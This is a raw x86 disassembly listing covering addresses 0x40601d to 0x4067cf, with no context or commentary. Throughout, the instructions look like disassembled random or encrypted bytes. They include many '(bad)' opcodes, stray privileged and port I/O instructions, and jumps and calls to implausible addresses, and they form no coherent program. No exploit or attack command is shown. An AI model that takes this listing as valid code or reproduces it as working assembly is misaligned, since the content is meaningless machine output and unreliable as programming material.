  40601d:	and    eax,DWORD PTR [ebx+ecx*2-0x288974a6]
  406024:	iret   
  406025:	fcom   QWORD PTR [edx-0x514117a8]
  40602b:	push   esi
  40602c:	inc    esp
  40602d:	or     ebp,edx
  40602f:	test   al,0xdf
  406031:	mov    edx,0xdf2016ab
  406036:	stos   DWORD PTR es:[edi],eax
  406037:	mov    edx,0x3f451080
  40603c:	or     ah,BYTE PTR [edi+edi*4]
  40603f:	cmp    al,0xdd
  406041:	stos   DWORD PTR es:[edi],eax
  406042:	ss jnp 0x406002
  406045:	fmul   DWORD PTR [ebx-0x6eb4f25c]
  40604b:	dec    ebx
  40604c:	lea    ecx,[edx]
  40604e:	inc    ebp
  40604f:	mov    ebp,0x58cc42db
  406054:	les    ecx,FWORD PTR [ebx+edx*1]
  406057:	shl    ah,cl
  406059:	push   ebp
  40605a:	add    ecx,ebp
  40605c:	add    ch,dh
  40605e:	add    bl,BYTE PTR [edi-0x6f]
  406061:	or     eax,0xf1a6ac8c
  406066:	scas   al,BYTE PTR es:[edi]
  406067:	fild   QWORD PTR [ebx-0x54163730]
  40606d:	and    ebp,ecx
  40606f:	daa    
  406070:	(bad)  
  406071:	addr16 pop edi
  406073:	sbb    al,0x32
  406075:	sahf   
  406076:	jg     0x406097
  406078:	repz inc edx
  40607a:	push   ebx
  40607b:	lds    ebx,FWORD PTR [edx-0x21d6e752]
  406081:	dec    edi
  406082:	inc    ebx
  406083:	cdq    
  406084:	xchg   ebp,eax
  406085:	pop    esi
  406086:	fucomp st(4)
  406088:	add    al,0x34
  40608a:	outs   dx,BYTE PTR ds:[esi]
  40608b:	add    DWORD PTR [ebp+0x3],esp
  40608e:	ficomp DWORD PTR [ebp-0x7d]
  406091:	js     0x406020
  406093:	mov    eax,ds:0x130baae9
  406098:	lds    ebp,FWORD PTR [edx-0x2a]
  40609b:	scas   al,BYTE PTR es:[edi]
  40609c:	sbb    DWORD PTR [edx],esi
  40609e:	xor    edx,DWORD PTR [esi+0x7aae76d]
  4060a4:	mov    dh,0x62
  4060a6:	int3   
  4060a7:	mov    BYTE PTR [eax+0x4],al
  4060aa:	adc    al,0x2f
  4060ac:	cld    
  4060ad:	les    edx,FWORD PTR [eax-0x679f5da8]
  4060b3:	call   0xc2ee616e
  4060b8:	out    0x5a,eax
  4060ba:	(bad)  
  4060bb:	push   esi
  4060bc:	ret    
  4060bd:	(bad)  
  4060be:	jmp    0x4060f7
  4060c0:	aam    0xbd
  4060c2:	add    al,BYTE PTR [esi+0x34]
  4060c5:	cli    
  4060c6:	test   al,0x3
  4060c8:	fldenv [eax+0x2963c4cf]
  4060ce:	push   0x3f30dbba
  4060d3:	repnz pop esi
  4060d5:	push   ebx
  4060d6:	repnz inc esp
  4060d8:	fs addr16 ds hlt 
  4060dc:	loop   0x406071
  4060de:	(bad)
  4060e1:	lds    ebx,FWORD PTR [eax+0x30]
  4060e4:	and    BYTE PTR [ebp-0x14],dl
  4060e7:	sahf   
  4060e8:	(bad)  
  4060ea:	iret   
  4060eb:	loopne 0x406085
  4060ed:	fsubr  QWORD PTR [edx]
  4060ef:	out    0x7b,al
  4060f1:	shr    DWORD PTR [ebx+ebx*2-0x44459585],1
  4060f8:	mov    bl,0x4
  4060fa:	or     al,0x6a
  4060fc:	push   ds
  4060fd:	add    DWORD PTR [edi+edi*4+0x10056965],edx
  406104:	or     al,0xb0
  406106:	or     ch,BYTE PTR [eax+0x25]
  406109:	inc    ebx
  40610a:	mov    ch,BYTE PTR [eax-0x3cfe1239]
  406110:	pop    esp
  406111:	lock daa 
  406113:	mov    ah,0x35
  406115:	clc    
  406116:	cwde   
  406117:	jp     0x4060c1
  406119:	addr16 pop ebp
  40611b:	outs   dx,DWORD PTR ds:[esi]
  40611c:	lea    eax,[edx]
  40611e:	arpl   WORD PTR ss:[ebx-0x77],di
  406122:	std    
  406123:	or     edx,ebp
  406125:	cmp    DWORD PTR [edi],eax
  406127:	clc    
  406128:	jmp    0x4060d0
  40612a:	les    edx,FWORD PTR [edi+eax*1]
  40612d:	fs cmc 
  40612f:	hlt    
  406130:	mov    ah,0x11
  406132:	jns    0x4061b0
  406134:	push   0xf39196c1
  406139:	push   edx
  40613a:	in     eax,0x98
  40613c:	mov    dl,0xdb
  40613e:	scas   al,BYTE PTR es:[edi]
  40613f:	jle    0x40619f
  406141:	loop   0x4061b8
  406143:	mov    eax,0x74d1fc01
  406148:	sar    DWORD PTR [esi],1
  40614a:	pop    ebx
  40614b:	icebp  
  40614c:	sbb    BYTE PTR [esi-0x1d],cl
  40614f:	into   
  406150:	lods   eax,DWORD PTR ds:[esi]
  406151:	outs   dx,BYTE PTR ds:[esi]
  406152:	dec    ecx
  406153:	xchg   BYTE PTR [edi+esi*8-0x22],cl
  406157:	pop    edi
  406158:	bts    DWORD PTR [ebx],esp
  40615b:	retf   
  40615c:	fmul   st,st(5)
  40615e:	popa   
  40615f:	stos   BYTE PTR es:[edi],al
  406160:	or     al,0x64
  406162:	fld    QWORD PTR [edx]
  406164:	popf   
  406165:	jbe    0x4061e5
  406167:	lods   al,BYTE PTR ds:[esi]
  406168:	hlt    
  406169:	loop   0x40612c
  40616b:	aaa    
  40616c:	je     0x406125
  40616e:	mov    BYTE PTR [esi-0xd],al
  406171:	outs   dx,BYTE PTR ds:[esi]
  406172:	loop   0x406183
  406174:	pusha  
  406175:	sbb    esp,ebx
  406177:	jg     0x4061cd
  406179:	ins    DWORD PTR es:[edi],dx
  40617a:	xor    al,0xb7
  40617c:	pop    ebp
  40617d:	xchg   edi,eax
  40617e:	jne    0x40611a
  406180:	push   es
  406181:	pop    esp
  406182:	stos   BYTE PTR es:[edi],al
  406183:	add    al,0x3e
  406185:	or     ebx,ebx
  406187:	jecxz  0x406179
  406189:	sbb    eax,0x351326c3
  40618e:	xchg   esi,eax
  40618f:	mov    ds:0x82c5d28e,al
  406194:	xor    BYTE PTR ds:0x7bede072,ch
  40619a:	lahf   
  40619b:	ja     0x4061d3
  40619d:	sar    BYTE PTR [edi-0xe],cl
  4061a0:	ficom  DWORD PTR [ebp+edi*1-0x64568e47]
  4061a7:	mov    al,0xe3
  4061a9:	enter  0xb80a,0x7c
  4061ad:	inc    esp
  4061ae:	loopne 0x406173
  4061b0:	fadd   DWORD PTR [eax+0x5d6351cf]
  4061b6:	xchg   DWORD PTR [eax+0x3de8e241],esp
  4061bc:	add    al,0x29
  4061be:	repz mov bh,0x4c
  4061c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061c2:	xchg   BYTE PTR [ebx+esi*4-0x71],al
  4061c6:	inc    ebx
  4061c7:	pop    esp
  4061c8:	pop    ebp
  4061c9:	dec    eax
  4061ca:	stc    
  4061cb:	retf   0xc0eb
  4061ce:	jp     0x406212
  4061d0:	xor    bl,BYTE PTR [edx+ebp*1+0x3b]
  4061d4:	xchg   esp,eax
  4061d5:	mov    ebp,0x97d4f168
  4061da:	rcl    esp,1
  4061dc:	cmp    al,0xc5
  4061de:	(bad)  
  4061e0:	inc    ecx
  4061e1:	popa   
  4061e2:	dec    eax
  4061e3:	mov    dh,0x21
  4061e5:	nop
  4061e6:	imul   eax,DWORD PTR [ebx],0x71
  4061e9:	jmp    0x40617a
  4061eb:	sti    
  4061ec:	loopne 0x406210
  4061ee:	mov    esp,0xd08f32c4
  4061f3:	mov    dl,0x4f
  4061f5:	rcl    dh,1
  4061f7:	dec    ebx
  4061f8:	lock jl 0x4061f0
  4061fb:	xchg   esi,eax
  4061fc:	inc    ebp
  4061fd:	in     eax,dx
  4061fe:	adc    eax,0x79ce9647
  406203:	xchg   edx,eax
  406204:	xor    BYTE PTR [esi],ch
  406206:	pop    ss
  406207:	and    eax,0xe04a3344
  40620c:	in     al,0xe7
  40620e:	or     BYTE PTR [ebx+0x397ef235],bh
  406214:	adc    al,0xac
  406216:	mov    ?,WORD PTR [ebx-0x19c90f08]
  40621c:	ficom  WORD PTR [ecx-0x52]
  40621f:	add    al,0xea
  406221:	aam    0x5
  406223:	fbld   TBYTE PTR [edi]
  406225:	cmp    ebx,DWORD PTR ds:0xe727b702
  40622b:	pop    esp
  40622c:	inc    esp
  40622d:	sub    BYTE PTR [eax],dh
  40622f:	ret    0x6ac0
  406232:	jb     0x4061c5
  406234:	dec    ebp
  406235:	xchg   edi,eax
  406236:	shl    dh,cl
  406238:	(bad)  
  40623a:	les    esi,FWORD PTR ds:0x54cb69f3
  406240:	test   eax,0x984b4841
  406245:	cwde   
  406246:	or     DWORD PTR [ebx-0x11],ebx
  406249:	or     ah,BYTE PTR [eax+esi*4-0x50864488]
  406250:	div    ah
  406252:	mov    eax,ds:0x40ca01e3
  406257:	jae    0x4062b2
  406259:	add    DWORD PTR [ecx-0x6a4f3b8e],edx
  40625f:	loop   0x40622a
  406261:	jl     0x406215
  406263:	(bad)  
  406264:	fst    DWORD PTR [edi+0x45]
  406267:	and    BYTE PTR [ecx],ch
  406269:	lock mov ebx,0x29a3f1be
  40626f:	or     cl,dh
  406271:	or     eax,0xdc94aa17
  406276:	xor    al,0x50
  406278:	push   esp
  406279:	bound  ebx,QWORD PTR [eax+0x48253fde]
  40627f:	shl    ebp,cl
  406281:	mov    ch,cl
  406283:	xlat   BYTE PTR ds:[ebx]
  406284:	outs   dx,BYTE PTR ds:[esi]
  406285:	in     al,0x52
  406287:	aaa    
  406288:	mov    DWORD PTR [edx-0x79],eax
  40628b:	jge    0x4062a2
  40628d:	mov    al,0x55
  40628f:	push   ebp
  406290:	rcr    esi,1
  406292:	imul   edx,DWORD PTR [eax],0xf8e48b91
  406298:	test   BYTE PTR [esi+eiz*1-0x15],cl
  40629c:	dec    edi
  40629d:	inc    ebp
  40629e:	inc    edx
  40629f:	dec    eax
  4062a0:	test   al,0x27
  4062a2:	push   ecx
  4062a3:	fs fwait
  4062a5:	aam    0x0
  4062a7:	loope  0x4062f9
  4062a9:	test   al,0xfd
  4062ab:	cmp    BYTE PTR [edx],0x7a
  4062ae:	mov    bh,BYTE PTR [ecx+0x19]
  4062b1:	popa   
  4062b2:	das    
  4062b3:	jae    0x40626e
  4062b5:	push   ecx
  4062b6:	pop    ss
  4062b7:	adc    esi,DWORD PTR [esi+0x6f]
  4062ba:	mov    ah,0x77
  4062bc:	aad    0xe0
  4062be:	(bad)  
  4062bf:	pop    eax
  4062c0:	xchg   dh,dl
  4062c2:	int3   
  4062c3:	popa   
  4062c4:	daa    
  4062c5:	and    DWORD PTR [edi-0xff9234f],edi
  4062cb:	add    ecx,DWORD PTR [esi-0x68]
  4062ce:	repz mov dl,0xff
  4062d1:	(bad)  
  4062d2:	pop    edi
  4062d3:	ss (bad) 
  4062d5:	std    
  4062d6:	mov    ds:0xb85b82fe,al
  4062db:	pop    es
  4062dc:	mov    es,esi
  4062de:	(bad)  
  4062e0:	cli    
  4062e1:	dec    esp
  4062e2:	jno    0x40632f
  4062e4:	jnp    0x40635a
  4062e6:	outs   dx,BYTE PTR ds:[esi]
  4062e7:	pop    ebx
  4062e8:	scas   eax,DWORD PTR es:[edi]
  4062e9:	aas    
  4062ea:	call   0x2e328145
  4062ef:	mov    edi,0xbb70f114
  4062f4:	mov    al,0xab
  4062f6:	popa   
  4062f7:	test   BYTE PTR [eax+0x1c2d247b],dl
  4062fd:	sahf   
  4062fe:	push   ecx
  4062ff:	push   esi
  406300:	loope  0x406293
  406302:	lea    ecx,[esi+0x341a0656]
  406308:	ja     0x406372
  40630a:	cmp    BYTE PTR [edx+0x5],dh
  40630d:	es in  eax,0x5a
  406310:	push   ds
  406311:	jmp    FWORD PTR [esi+0x70]
  406314:	imul   ebx,DWORD PTR [edx],0x7501f534
  40631a:	pop    edx
  40631b:	or     edx,eax
  40631d:	push   ss
  40631e:	loope  0x40632c
  406320:	pop    es
  406321:	mov    ah,0x31
  406323:	ins    DWORD PTR es:[edi],dx
  406324:	or     al,0x10
  406326:	out    dx,eax
  406327:	arpl   sp,dx
  406329:	push   ecx
  40632a:	movnti DWORD PTR [edi-0x43],ebx
  40632e:	ret    0xa45f
  406331:	psubusw mm6,QWORD PTR [ecx+0x26960472]
  406338:	lods   eax,DWORD PTR ds:[esi]
  406339:	push   0xcdd843d6
  40633e:	hlt    
  40633f:	bound  eax,QWORD PTR [esi-0xa]
  406342:	cmp    BYTE PTR [edx+eiz*1],cl
  406345:	enter  0xdb77,0xed
  406349:	or     BYTE PTR [eax-0x5f8f0e4d],cl
  40634f:	outs   dx,BYTE PTR ds:[esi]
  406350:	cmp    eax,0x6fbe6286
  406355:	or     eax,0x2be7f8ce
  40635a:	mov    esp,gs
  40635c:	call   FWORD PTR [ecx+0x4502ad9f]
  406362:	retf   
  406363:	xor    eax,0x360be4cc
  406368:	sub    DWORD PTR [edx],esp
  40636a:	test   al,0x52
  40636c:	(bad)  
  40636d:	sbb    al,0x62
  40636f:	dec    eax
  406370:	or     al,BYTE PTR [ebp-0x72]
  406373:	jae    0x4062fa
  406375:	adc    BYTE PTR [ecx+0x6d],dh
  406378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406379:	inc    eax
  40637a:	lahf   
  40637b:	aas    
  40637c:	inc    ebp
  40637d:	sub    ebx,DWORD PTR [esi+0x35bb2bd6]
  406383:	and    edi,DWORD PTR [esi+ebp*1+0x79f3792e]
  40638a:	sub    DWORD PTR [eax+ebp*1+0xf],edi
  40638e:	cmp    cl,BYTE PTR [ebp-0x761eed40]
  406394:	aas    
  406395:	xor    bh,dl
  406397:	mov    ebp,0x3c5f5985
  40639c:	sub    edi,ebp
  40639e:	xor    edx,esp
  4063a0:	mov    ah,0x9b
  4063a2:	pop    ebp
  4063a3:	ja     0x4063fa
  4063a5:	cmp    esi,edi
  4063a7:	xchg   DWORD PTR [ebx+0x8f435c3],eax
  4063ad:	loope  0x40641f
  4063af:	stos   DWORD PTR es:[edi],eax
  4063b0:	jns    0x4063d0
  4063b2:	inc    ebx
  4063b3:	das    
  4063b4:	les    edx,FWORD PTR [ebx+0x54]
  4063b7:	pusha  
  4063b8:	ss out dx,eax
  4063ba:	jmp    0x406392
  4063bc:	(bad)  
  4063bd:	sbb    cl,BYTE PTR ds:0x97e8d250
  4063c3:	aas    
  4063c4:	jle    0x4063ab
  4063c6:	adc    al,0x7a
  4063c8:	idiv   DWORD PTR [ebp+0x8]
  4063cb:	pop    ebp
  4063cc:	xor    esi,eax
  4063ce:	sbb    eax,DWORD PTR [eax-0x4bf057a7]
  4063d4:	add    ebx,DWORD PTR [esi+ebx*2+0x6e87e9b0]
  4063db:	in     al,0x65
  4063dd:	mov    esp,0x27b12811
  4063e2:	loopne 0x406425
  4063e4:	in     al,0x6a
  4063e6:	ins    DWORD PTR es:[edi],dx
  4063e7:	rcr    BYTE PTR fs:[edx+ebx*2-0x2ee32c2e],0xa4
  4063f0:	enter  0x44f9,0x9d
  4063f4:	inc    ebp
  4063f5:	jle    0x406464
  4063f7:	sub    bl,BYTE PTR [ebp+0x6a2232d2]
  4063fd:	cmp    al,0x5f
  4063ff:	xchg   esi,edx
  406401:	out    0xa3,al
  406403:	pop    ss
  406404:	or     al,0x9d
  406406:	mov    ecx,ebp
  406408:	iret   
  406409:	inc    ebp
  40640a:	pop    edx
  40640b:	xor    dl,BYTE PTR [esi+ebp*4+0x94f8146]
  406412:	push   es
  406413:	fwait
  406414:	dec    ecx
  406415:	and    esp,DWORD PTR [eax-0x281a40e2]
  40641b:	jbe    0x4063e5
  40641d:	inc    eax
  40641e:	(bad)  
  40641f:	popf   
  406420:	aas    
  406421:	and    edx,DWORD PTR [ebx+0x6744bd14]
  406427:	outs   dx,BYTE PTR ds:[esi]
  406428:	push   0x24
  40642a:	cmp    BYTE PTR [edx-0x72dda1a8],bh
  406430:	push   edi
  406431:	add    BYTE PTR [ebp-0x2c],al
  406434:	add    eax,0x77872c45
  406439:	or     DWORD PTR [edx],0x24
  40643c:	dec    esp
  40643d:	push   edx
  40643e:	and    DWORD PTR [edi+0x52ed0cdd],ebx
  406444:	push   ecx
  406445:	push   esp
  406446:	lea    eax,[edx]
  406448:	sbb    DWORD PTR [ecx],0xa06b0281
  40644e:	pop    ebx
  40644f:	aad    0x61
  406451:	imul   ecx,DWORD PTR [esi+0x3e60692a],0xffffffb8
  406458:	dec    ecx
  406459:	stos   BYTE PTR es:[edi],al
  40645a:	jmp    0x4064d9
  40645c:	test   eax,0xc6a585b6
  406461:	xor    BYTE PTR [ebx-0x5f],al
  406464:	sub    BYTE PTR [ebp-0x2da7973e],0x2f
  40646b:	(bad)  
  40646c:	in     eax,dx
  40646d:	mov    eax,ds:0xf86b2465
  406472:	out    dx,al
  406473:	pop    ss
  406474:	fst    DWORD PTR [ebx]
  406476:	dec    ebp
  406477:	scas   al,BYTE PTR es:[edi]
  406478:	mov    ebx,0xecc69ec1
  40647d:	call   0xddc8bc57
  406482:	push   cs
  406483:	push   eax
  406484:	xchg   DWORD PTR [eax-0x65],esp
  406487:	inc    esi
  406488:	xor    DWORD PTR [ecx],esp
  40648a:	sub    eax,0x36eac328
  40648f:	call   DWORD PTR [edx-0x2d]
  406492:	jge    0x4064cb
  406494:	and    eax,DWORD PTR [ecx]
  406496:	adc    ebx,DWORD PTR [ecx+0x32]
  406499:	lds    edi,FWORD PTR cs:[edx-0x48]
  40649d:	cmc    
  40649e:	mov    edx,0x2cc70c97
  4064a3:	dec    edi
  4064a4:	ror    DWORD PTR [esi],cl
  4064a6:	cmp    ebx,edx
  4064a8:	inc    ebx
  4064a9:	inc    edx
  4064aa:	pop    es
  4064ab:	sub    eax,0xc9b2e2c
  4064b0:	cmp    eax,0x9c9fed5d
  4064b5:	ret    
  4064b6:	aaa    
  4064b7:	mov    ch,0xb4
  4064b9:	push   edi
  4064ba:	icebp  
  4064bb:	lock (bad) 
  4064bd:	push   edi
  4064be:	add    eax,0x9280045f
  4064c3:	and    ch,BYTE PTR [ebx+0x2c5dd426]
  4064c9:	in     al,0xbc
  4064cb:	add    al,0xb9
  4064cd:	mov    edi,0xbfa2ccc6
  4064d2:	es add eax,0x478cb7f1
  4064d8:	popf   
  4064d9:	xor    DWORD PTR [eax],edx
  4064db:	or     al,0xed
  4064dd:	ror    ch,0x93
  4064e0:	pop    esp
  4064e1:	jae    0x4064d6
  4064e3:	sbb    edx,DWORD PTR [ebp-0x75fa05e0]
  4064e9:	std    
  4064ea:	cld    
  4064eb:	les    edi,FWORD PTR [esi+0x27]
  4064ee:	inc    edi
  4064ef:	xchg   esi,eax
  4064f1:	hlt    
  4064f2:	(bad)  
  4064f3:	mov    eax,ds:0xfcb21f8f
  4064f8:	push   esi
  4064f9:	add    BYTE PTR [ecx+0x6c],0xd5
  4064fd:	dec    ebx
  4064fe:	not    cl
  406500:	imul   edx,DWORD PTR [edi],0x1eb2a992
  406506:	or     BYTE PTR [esi+ecx*8],dh
  406509:	mov    ah,0x1a
  40650b:	sbb    esi,esp
  40650d:	jg     0x406575
  40650f:	pop    ds
  406510:	cmp    DWORD PTR [edi],edi
  406512:	push   edi
  406513:	jmp    0x406547
  406515:	in     eax,dx
  406516:	mov    edx,0x7f43d9bb
  40651b:	scas   al,BYTE PTR es:[edi]
  40651c:	xchg   esp,eax
  40651d:	clc    
  40651e:	mov    esi,0xdee46432
  406523:	jne    0x406513
  406525:	shl    ebp,1
  406527:	ficom  DWORD PTR [edi+0x3bb2b684]
  40652d:	inc    edi
  40652e:	imul   ecx,DWORD PTR [ebp+0x42],0xffffff9b
  406532:	daa    
  406533:	cdq    
  406534:	pop    eax
  406535:	ret    
  406536:	popa   
  406537:	sbb    eax,0xe4961eec
  40653c:	std    
  40653d:	xor    bl,BYTE PTR [ecx+0x8]
  406540:	add    DWORD PTR [ebx-0x5c514ec5],ebp
  406546:	mov    esi,DWORD PTR [esi]
  406548:	lds    ecx,FWORD PTR [eax+0x304df5c0]
  40654e:	imul   esp,DWORD PTR [edi-0x25],0x8b623f31
  406555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406556:	ret    0x5739
  406559:	es xchg esp,eax
  40655b:	rdtsc  
  40655d:	je     0x40654a
  40655f:	daa    
  406560:	jbe    0x406512
  406562:	xchg   BYTE PTR [esi-0x71],dl
  406565:	cmp    ebp,DWORD PTR [ebp+0x2e76e081]
  40656b:	cmp    BYTE PTR [ecx],dh
  40656d:	pop    eax
  40656e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40656f:	test   al,0x94
  406571:	add    dh,BYTE PTR [eax-0x64]
  406574:	and    al,0x9
  406576:	jp     0x40658d
  406578:	sti    
  406579:	mov    edi,0xe0567704
  40657e:	popa   
  40657f:	pusha  
  406580:	loopne 0x4065d3
  406582:	retf   
  406583:	mov    dl,0x27
  406585:	clc    
  406586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406587:	scas   eax,DWORD PTR es:[edi]
  406588:	js     0x40652c
  40658a:	dec    ebx
  40658b:	and    al,0xeb
  40658d:	mov    ds:0xc0f6f7b0,al
  406592:	pushf  
  406593:	xchg   ebx,eax
  406594:	inc    ecx
  406595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406596:	xor    ebp,DWORD PTR [ecx-0x8]
  406599:	push   0xffffff93
  40659b:	in     al,0x51
  40659d:	inc    esi
  40659e:	xlat   BYTE PTR ds:[ebx]
  40659f:	outs   dx,DWORD PTR ds:[esi]
  4065a0:	xor    BYTE PTR [eax-0x7c],dl
  4065a3:	push   ecx
  4065a4:	add    DWORD PTR [ecx-0x75],esp
  4065a7:	push   ss
  4065a8:	inc    ebp
  4065a9:	outs   dx,DWORD PTR ds:[esi]
  4065aa:	and    al,0x93
  4065ac:	mov    eax,ds:0xdad35bab
  4065b1:	push   edx
  4065b2:	fist   WORD PTR [esi+0x1]
  4065b5:	loopne 0x4065fe
  4065b7:	add    esp,DWORD PTR [eax-0x1d550a4c]
  4065bd:	mov    ebx,0xaffbab13
  4065c2:	(bad)  
  4065c3:	xor    al,0x73
  4065c5:	mov    edx,0x3d91bd0e
  4065ca:	jbe    0x40659c
  4065cc:	(bad)  [edi]
  4065ce:	jbe    0x4065b9
  4065d0:	aad    0x91
  4065d2:	pop    edi
  4065d3:	cmp    eax,0x714d1ab4
  4065d8:	sub    edi,DWORD PTR [esi+edi*4+0x58311fea]
  4065df:	int    0x0
  4065e1:	add    BYTE PTR [ebp-0x8],bh
  4065e4:	xchg   esp,eax
  4065e5:	mov    ds:0x69df6633,al
  4065ea:	cs cmp al,bl
  4065ed:	repz push cs
  4065ef:	push   es
  4065f0:	inc    ebx
  4065f1:	addr16 jmp 0x40662a
  4065f4:	pop    edi
  4065f5:	sub    cl,al
  4065f7:	popf   
  4065f8:	popa   
  4065f9:	sahf   
  4065fa:	ror    DWORD PTR [ebx-0x14150525],1
  406600:	adc    BYTE PTR [ebx],dl
  406602:	inc    ebx
  406603:	stos   BYTE PTR es:[edi],al
  406604:	sub    bh,BYTE PTR [edx]
  406606:	mov    gs,esi
  406608:	or     eax,0xe2f8dfb4
  40660d:	stos   DWORD PTR es:[edi],eax
  40660e:	repz pusha 
  406610:	mov    WORD PTR ds:0xcd22bf0d,?
  406616:	lods   eax,DWORD PTR ds:[esi]
  406617:	call   0x7b7d:0xbbe72aff
  40661e:	dec    esi
  40661f:	mov    ah,dh
  406621:	add    dh,BYTE PTR [eax-0x63]
  406624:	and    al,0xd6
  406626:	cmp    al,0x95
  406628:	dec    ebp
  406629:	or     ch,BYTE PTR [ecx]
  40662b:	fadd   st(3),st
  40662d:	(bad)  
  40662e:	push   edi
  40662f:	jne    0x4065f4
  406631:	rol    dh,cl
  406633:	jae    0x4065fa
  406635:	mov    ebx,0x84f4a236
  40663a:	mov    bh,0x92
  40663c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40663d:	lods   al,BYTE PTR ds:[esi]
  40663e:	adc    ebp,DWORD PTR [edx*8-0x26befe43]
  406645:	adc    eax,0x71fdb470
  40664a:	add    dh,dl
  40664c:	xchg   ebx,eax
  40664d:	mov    edi,0x32463053
  406652:	out    dx,al
  406653:	pop    ss
  406654:	(bad)  
  406655:	adc    DWORD PTR [ebp-0x2f],edi
  406658:	cmc    
  406659:	inc    esp
  40665a:	and    eax,0x93bec965
  40665f:	dec    esp
  406660:	aam    0xd1
  406662:	or     eax,0xfec08506
  406667:	out    0x11,al
  406669:	or     al,0xfd
  40666b:	push   esi
  40666c:	mov    edx,0xad3bbfc2
  406671:	popa   
  406672:	scas   al,BYTE PTR es:[edi]
  406673:	jne    0x4066c1
  406675:	ret    
  406676:	ds mov ch,0x3
  406679:	cmp    DWORD PTR [esi-0x69],ebp
  40667c:	mov    dh,0x34
  40667e:	pop    ebx
  40667f:	mov    eax,ds:0x1463e4d5
  406684:	mov    ds:0xa98713a9,eax
  406689:	shl    BYTE PTR [ebp+edi*2-0x5f36900e],cl
  406690:	cmp    eax,0x9ab4ec5b
  406695:	jle    0x4066fe
  406697:	data16 jge 0x406676
  40669a:	enter  0xab05,0xdb
  40669e:	inc    ecx
  40669f:	sbb    DWORD PTR [ebx+esi*1-0x597feee2],eax
  4066a6:	int3   
  4066a7:	add    BYTE PTR [edi-0x4d500665],0xdf
  4066ae:	hlt    
  4066af:	push   edx
  4066b0:	int3   
  4066b1:	push   edi
  4066b2:	or     DWORD PTR [bx+0x5d],0x1b8e961b
  4066ba:	xchg   ecx,eax
  4066bb:	sub    esi,ebx
  4066bd:	inc    esp
  4066be:	dec    esi
  4066bf:	out    0x31,eax
  4066c1:	inc    esi
  4066c2:	iret   
  4066c3:	and    BYTE PTR [edx],bh
  4066c5:	aam    0x4b
  4066c7:	and    DWORD PTR [edi-0x4a],eax
  4066ca:	xchg   edi,eax
  4066cb:	jecxz  0x406728
  4066cd:	test   eax,0xeafe84b2
  4066d2:	test   al,bl
  4066d4:	pop    ss
  4066d5:	into   
  4066d6:	jecxz  0x4066f8
  4066d8:	mov    ds:0xcd0f84ad,eax
  4066dd:	aas    
  4066de:	mov    ebp,0xeeeb6301
  4066e3:	in     al,dx
  4066e4:	dec    esi
  4066e5:	jb     0x406678
  4066e7:	dec    esi
  4066e8:	(bad)  
  4066e9:	aam    0xae
  4066eb:	jmp    0x4066dd
  4066ed:	(bad)  
  4066ee:	fmul   DWORD PTR [edi]
  4066f0:	jnp    0x40675e
  4066f2:	fwait
  4066f3:	or     BYTE PTR [edx-0xb],cl
  4066f6:	add    dh,ch
  4066f8:	out    dx,al
  4066f9:	(bad)  
  4066fa:	lods   eax,DWORD PTR ds:[esi]
  4066fb:	mov    dl,0x3d
  4066fd:	add    bl,dh
  4066ff:	fwait
  406700:	mov    ch,0x4f
  406702:	fsincos 
  406704:	nop
  406705:	xor    DWORD PTR [esi+0x366d5d7d],0xb3b08091
  40670f:	mov    ebp,0xc5675412
  406714:	loop   0x4066dc
  406716:	inc    esp
  406717:	add    al,0x2d
  406719:	scas   al,BYTE PTR es:[edi]
  40671a:	mov    edi,0x8e6cf447
  40671f:	ss int3 
  406721:	push   edx
  406722:	sbb    ebp,esp
  406724:	(bad)  
  406725:	fadd   st(3),st
  406727:	int    0xa0
  406729:	push   esp
  40672a:	xor    dl,BYTE PTR [esi+edi*1+0x11164bcf]
  406731:	ins    BYTE PTR es:[edi],dx
  406732:	xor    eax,0x8f97fe1e
  406737:	dec    esi
  406738:	jbe    0x406784
  40673a:	sti    
  40673b:	jl     0x406733
  40673d:	retf   0xcc05
  406740:	cmp    cl,BYTE PTR [eax]
  406742:	gs test al,0x2
  406745:	in     al,dx
  406746:	sub    DWORD PTR [eax-0x6],edx
  406749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40674a:	or     DWORD PTR ds:[ebx+0x51],edi
  40674e:	jno    0x406723
  406750:	in     al,dx
  406751:	out    0x6f,eax
  406753:	data16 repnz arpl WORD PTR [edx-0x3e],ax
  406758:	mov    ds:0xc46704c7,al
  40675d:	mov    ?,WORD PTR [edx+0x77]
  406760:	imul   ebx,ecx,0x3
  406763:	rcl    BYTE PTR [edi],cl
  406765:	test   esp,ebx
  406767:	iret   
  406768:	inc    ebx
  406769:	fdivr  QWORD PTR [esi-0x7c1b8246]
  40676f:	stos   DWORD PTR es:[edi],eax
  406770:	push   0x6e5a584e
  406775:	mov    edi,DWORD PTR [ebx+0x3935d13e]
  40677b:	dec    ebx
  40677c:	mov    al,0xd8
  40677e:	cmp    al,0x8d
  406780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406781:	in     al,0x49
  406783:	xchg   edi,eax
  406784:	inc    eax
  406785:	jl     0x4067d5
  406787:	mov    cl,0x21
  406789:	fs dec ebp
  40678b:	sub    dl,BYTE PTR [ebp-0x49]
  40678e:	mov    cl,0xb
  406790:	add    BYTE PTR [edx+0x309af3ae],dh
  406796:	es enter 0x13a7,0x5a
  40679b:	jae    0x4067e9
  40679d:	es cmp esi,esi
  4067a0:	add    ah,BYTE PTR [eax-0x37156c31]
  4067a6:	jmp    0x1daeded5
  4067ab:	fnsave [ebp-0x52af7f34]
  4067b1:	cmp    al,BYTE PTR [ebp+0x44]
  4067b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067b5:	jmp    0xa9906ed4
  4067ba:	aaa    
  4067bb:	adc    ch,BYTE PTR [esi]
  4067bd:	outs   dx,DWORD PTR ds:[esi]
  4067be:	stos   DWORD PTR es:[edi],eax
  4067bf:	cmp    DWORD PTR [eax+0x5e5d6df6],esi
  4067c5:	ret    
  4067c6:	push   ds
  4067c7:	shr    esi,cl
  4067c9:	ins    DWORD PTR es:[edi],dx
  4067ca:	std    
  4067cb:	(bad)  
  4067cc:	(bad)  [esi+eax*2]
  4067cf:	cmp    DWORD PTR [ecx+0x3951c9b6],0x56
